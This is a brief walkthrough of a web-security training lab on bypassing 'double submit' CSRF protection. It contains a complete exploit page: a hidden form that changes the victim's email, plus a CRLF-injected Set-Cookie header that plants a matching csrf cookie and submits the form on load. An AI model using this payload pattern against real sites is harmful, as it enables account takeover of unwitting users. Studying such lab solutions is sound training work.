Title: CSRF where token is duplicated in cookie
Level: PRACTITIONER
Desc:  This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough: 
<img width="1041" height="527" alt="image" src="https://github.com/user-attachments/assets/4a72affb-9033-4c9d-9269-204204d7710b" />

The csrf mechanism here is csrf token in body compared against csrf token in cookie, and as long as you have the same values in those places you can have there everything.
solution:
```
<form method="POST" action="https://0a9c007d03e72aca80c303c9006600d0.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test1321@normal-user.net">
    <input type="hidden" name="csrf" value="cokolwiek">
</form>
<img src="https://0a9c007d03e72aca80c303c9006600d0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=cokolwiek%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
